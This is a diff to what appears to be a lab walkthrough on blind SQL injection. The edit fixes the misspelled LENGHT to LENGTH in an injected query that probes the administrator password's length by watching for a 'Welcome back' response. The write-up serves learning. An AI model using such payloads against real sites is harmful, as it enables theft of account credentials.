@@ -94,10 +94,10 @@ After we determined how long their password is.
 We use :
 
 ``` sql
-SELECT TrackingId FROM TrakingUsers WHERE TrackingID = 'cbiud' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGHT (password) > 2) = 'a`
+SELECT TrackingId FROM TrakingUsers WHERE TrackingID = 'cbiud' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH (password) > 2) = 'a`
 ```
 
-The subquery `SELECT 'a' FROM users WHERE username = 'administrator' AND LENGHT (password) > 2` means to return a if the administrator's password is longer than 2.   
+The subquery `SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH (password) > 2` means to return a if the administrator's password is longer than 2.   
 Of course it is and the site respond with **Welcome back** message.
 
 We continue to try until the site doesn't show up the **Welcome back message** this why the password in not longer than the number we write, in fact is the same lenght of it.
